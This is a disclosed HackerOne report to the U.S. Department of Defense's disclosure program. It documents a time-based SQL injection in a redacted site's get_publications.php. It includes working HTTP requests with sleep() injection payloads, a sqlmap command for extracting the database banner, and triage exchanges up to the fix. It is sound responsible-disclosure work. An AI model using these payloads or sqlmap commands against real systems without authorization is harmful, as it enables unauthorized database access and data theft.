{"id":489483,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODk0ODM=","url":"https://hackerone.com/reports/489483","title":"SQL Injection in the get_publications.php on the https://█████","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-02-01T01:28:43.640Z","submitted_at":"2019-02-01T01:28:43.640Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sp1d3rs","url":"/sp1d3rs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-10-04T15:18:44.582Z","bug_reporter_agreed_on_going_public_at":"2019-07-10T20:29:33.277Z","team_member_agreed_on_going_public_at":"2019-10-04T15:18:44.526Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"##Description\nHello. I was able to find Time-based SQLI on the https://███/pubs/get_publications.php using `pub_group_id` parameter\n\n##POC\n```\nGET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b'\u0026rno86qi4=1 HTTP/1.1\nHost: █████\nConnection: keep-alive\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: https://█████/pubs/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\nCookie: _ga=GA1.2.1697249984.1548431559; __utma=161700579.1697249984.1548431559.1548902867.1548902867.1; __utmz=161700579.1548902867.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _test_cookie=0\n\n\n```\nThis request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.\nAs additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:\n```\nsqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5\n```\nwhere test.txt is a text fiile contained request dump above.\nResult:\n```\n5.5.62-0ubuntu0.14.04.1\n```\n█████\n\nNo sensitive data such as databases, tables, or content was accessed.\n\n## Impact\n\nSQL injection usually have high or critical impact.","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["daehee","dastan_9408","domssilva","klau5","unsecury","pwsh"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4075550,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2019-02-01T01:28:44.004Z","updated_at":"2019-02-01T01:28:44.004Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4075555,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is my second SQL injection on this asset (not duplicate), first was in #488795 in other script (library.php)","automated_response":false,"created_at":"2019-02-01T01:30:21.184Z","updated_at":"2019-02-01T01:30:26.997Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4081842,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Greetings,\n\nTo validate [your report] [the reported vulnerability], We require additional information.\n\nCan you please answer the following questions?\n\n@sp1d3rs all your evidence looks good here but I'm not able to replicate it unfortunately. I'm going to keep messing around with it and see whats going on. Can you test this again in sqlmap and make sure you can still get the banner? Make sure you clear what you have saved and do it fresh. I'm wondering if it got fixed before I had a chance to test it.\n\n…\n\nI will continue processing your report on receipt of your response.  You will receive another status update upon completion of this review.  If I have any other questions in the interim, I will be back in touch.  \n\nIf we do not receive a response within two weeks, we will send you a second request for this information.  If we do not receive a response from you within two weeks of the second notice, we will have to close this report without action. \n\nIf you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards, ","automated_response":false,"created_at":"2019-02-01T20:28:41.843Z","updated_at":"2019-02-01T20:28:41.843Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4081933,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @ag3nt-z3 yes, it still works. I forgot to add correct `test.txt` file to the report, sorry, it may be the reason why you couldn't reproduce it. It's a little different from the initial request (requires custom marker `*` in right place).\nHere is this file:\n██████████\n\nI also just now made a video of sqlmap usage for this file (to identify where we should use Y or N ):\n██████████\nI recorded till first symbol extraction from banner.\n\nMake sure that you request `https` version of the site (it doesn't work on `http`), and your sqlmap is up-to-date.\n\nAlso, as simple test, you can compare this two requests in Burp if for some reason sqlmap will fail:\n1)\n```\nGET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(1)))a)%2b'\u0026rno86qi4=1 HTTP/1.1\nHost: ███████\nConnection: keep-alive\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: https://████████/pubs/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\nCookie: _ga=GA1.2.1697249984.1548431559; __utma=161700579.1697249984.1548431559.1548902867.1548902867.1; __utmz=161700579.1548902867.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _test_cookie=0\n\n\n```\nThis will delay response for 1-2 seconds.\n2)\n```\nGET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(10)))a)%2b'\u0026rno86qi4=1 HTTP/1.1\nHost: ███\nConnection: keep-alive\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: https://███/pubs/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\nCookie: _ga=GA1.2.1697249984.1548431559; __utma=161700579.1697249984.1548431559.1548902867.1548902867.1; __utmz=161700579.1548902867.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _test_cookie=0\n\n\n```\nThis will delay response for 10-11 seconds\n█████\n\n","automated_response":false,"created_at":"2019-02-01T20:59:02.651Z","updated_at":"2019-09-25T15:05:48.043Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4091681,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-02-04T17:46:02.295Z","updated_at":"2019-02-04T17:46:02.295Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":291961},"actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4091682,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-02-04T17:46:04.794Z","updated_at":"2019-02-04T17:46:04.794Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4091690,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@sp1d3rs boom that was it. That's my bad, I blindly took your original PoC and put it into a text file and never even looked to see if I needed to remove any sql statements. You rock, keep up the good work!","automated_response":false,"created_at":"2019-02-04T17:49:04.355Z","updated_at":"2019-02-04T17:49:04.355Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4093127,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @ag3nt-z3 !","automated_response":false,"created_at":"2019-02-04T22:55:41.915Z","updated_at":"2019-02-04T22:55:41.915Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4235767,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@sp1d3rs \n\nThanks for all of your great research and submissions during the month of February. We would like to publicly recognize your hard work on our Twitter page @DC3VDP. Would you have any issues with that, and if not, would you like us to use your real name, just your alias, or both?\n\nDC3 VDP Team","automated_response":false,"created_at":"2019-03-01T14:45:09.428Z","updated_at":"2019-03-01T14:45:09.428Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4236952,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @agent-1 , it's awesome news, thanks!\nI'm open to the any option, you can tag my Twitter account `https://twitter.com/h1_sp1d3r`, it also contains real name (Evgeniy Yakovchuk).","automated_response":false,"created_at":"2019-03-01T17:17:44.438Z","updated_at":"2019-03-01T17:18:43.456Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4811665,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-05-10T18:40:49.291Z","updated_at":"2019-05-10T18:40:49.291Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sp1d3rs","url":"/sp1d3rs"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5293860,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-07-10T20:29:33.321Z","updated_at":"2019-07-10T20:29:33.321Z","first_to_agree":true,"actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5960154,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-10-04T15:18:44.546Z","updated_at":"2019-10-04T15:18:44.546Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5960155,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-10-04T15:18:44.600Z","updated_at":"2019-10-04T15:18:44.600Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5960157,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","automated_response":false,"created_at":"2019-10-04T15:18:51.047Z","updated_at":"2019-10-04T15:18:51.047Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6795260,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@sp1d3rs  \n\nAfter a through review of all researchers we want to congratulate you for being selected as the 2019 VDP Researcher of the Year!! In addition to being highlighted on Twitter we would like to put you in our 2019 Annual Report and also mail you a package of swag. We need two things from you:\n\n1. A headshot photo\n2. A mailing address\n\nIf you don't feel comfortable with providing the mailing address we can send it to HackerOne and they can coordinate the shipping to you. Please let us know.\n\nDoD VDP Team","automated_response":false,"created_at":"2020-01-16T22:10:59.485Z","updated_at":"2020-01-16T22:10:59.485Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6800144,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@sp1d3rs\n\nYou can also send us this information via email to VDP-Questions@dc3.mil","automated_response":false,"created_at":"2020-01-17T14:54:57.670Z","updated_at":"2020-01-17T14:54:57.670Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}